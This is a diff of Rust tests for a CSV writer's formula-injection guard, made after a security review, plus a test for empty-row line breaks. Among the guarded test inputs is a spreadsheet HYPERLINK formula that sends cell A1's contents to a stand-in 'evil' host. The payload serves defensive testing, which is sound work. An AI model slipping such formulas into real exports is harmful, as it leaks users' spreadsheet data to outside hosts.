@@ -160,7 +160,8 @@ fn injection_guard() {
         assert_eq!(text, guarded, "{input:?} -> {out:?}");
         assert_eq!(needs_injection_guard(input), input != guarded);
     }
-    // Numbers (and other non-text values) are never altered.
+    // Plain numbers are never altered; anything else is judged on its
+    // output text, whatever the cell type (security review H3).
     let out = write(
         vec![vec![
             CsvCell::value("-5"),
@@ -169,7 +170,7 @@ fn injection_guard() {
         ]],
         &CsvWriteOptions::default(),
     );
-    assert_eq!(out, "-5,+1E+10,=\r\n");
+    assert_eq!(out, "-5,+1E+10,'=\r\n");
     // The guard can be turned off.
     let off = CsvWriteOptions {
         injection_guard: false,
@@ -444,4 +445,99 @@ fn one_million_cells_parse_under_one_second() {
     eprintln!("1M cells parsed in {elapsed:?}");
     assert_eq!(sheet.cells.len(), 1_000_000);
     assert!(elapsed < Duration::from_secs(1), "{elapsed:?}");
+}
+
+/// Security review H3 + L5: the guard decides on the output string. A number
+/// whose format displays `=HYPERLINK(…)+5` is guarded; plain numeric
+/// literals pass through; leading whitespace/LF and full-width triggers are
+/// caught.
+#[test]
+fn injection_guard_applies_to_output_text() {
+    let guarded = [
+        "=HYPERLINK(\"http://evil/?\"&A1;\"x\")+5",
+        "-5 or 1=1",
+        "-$5.00",
+        " =1+1",
+        "\n=1+1",
+        "\u{a0}@SUM(A1)",
+        "＝1+1",
+        "＋1",
+        "－1",
+        "＠SUM(A1)",
+        "-",
+        "+",
+        "-1,",
+        "-1e",
+        "--5",
+        "-5-",
+        "-1.2.3",
+    ];
+    for t in guarded {
+        assert!(needs_injection_guard(t), "{t:?} should be guarded");
+        // Non-text cells are guarded too: `is_text` no longer matters.
+        let out = write(vec![vec![CsvCell::value(t)]], &CsvWriteOptions::default());
+        let back = read_csv(out.as_bytes(), &CsvOptions::default()).unwrap();
+        match &back.cells[0].content {
+            CellContentData::Value(Value::Text(x)) => {
+                assert!(x.starts_with('\''), "{t:?} -> {out:?}");
+            }
+            other => panic!("{other:?}"),
+        }
+    }
+    let plain = [
+        "-5",
+        "+5",
+        "-1,234.50",
+        "-0.5",
+        "-.5",
+        "+1E+10",
+        "-1e-3",
+        "-12%",
+        " -5",
+        "5",
+        "1,234",
+    ];
+    for t in plain {
+        assert!(!needs_injection_guard(t), "{t:?} should pass through");
+        assert_eq!(
+            write(vec![vec![CsvCell::value(t)]], &CsvWriteOptions::default()),
+            if t.starts_with(' ') {
+                format!("{t}\r\n")
+            } else if t.contains(',') {
+                format!("\"{t}\"\r\n")
+            } else {
+                format!("{t}\r\n")
+            }
+        );
+    }
+    // The raw-output escape hatch.
+    let off = CsvWriteOptions {
+        injection_guard: false,
+        ..CsvWriteOptions::default()
+    };
+    assert_eq!(
+        write(vec![vec![CsvCell::value("-$5.00")]], &off),
+        "-$5.00\r\n"
+    );
+}
+
+/// An empty row is written as a bare line break (the csv crate alone would
+/// write `""`), so sparse exports keep row positions without fake fields.
+#[test]
+fn empty_rows_are_bare_line_breaks() {
+    let out = write(
+        vec![
+            vec![],
+            vec![CsvCell::value("a")],
+            vec![],
+            vec![CsvCell::value("b")],
+        ],
+        &CsvWriteOptions::default(),
+    );
+    assert_eq!(out, "\r\na\r\n\r\nb\r\n");
+    let lf = CsvWriteOptions {
+        line_ending: LineEnding::Lf,
+        ..CsvWriteOptions::default()
+    };
+    assert_eq!(write(vec![vec![], vec![CsvCell::value("a")]], &lf), "\na\n");
 }
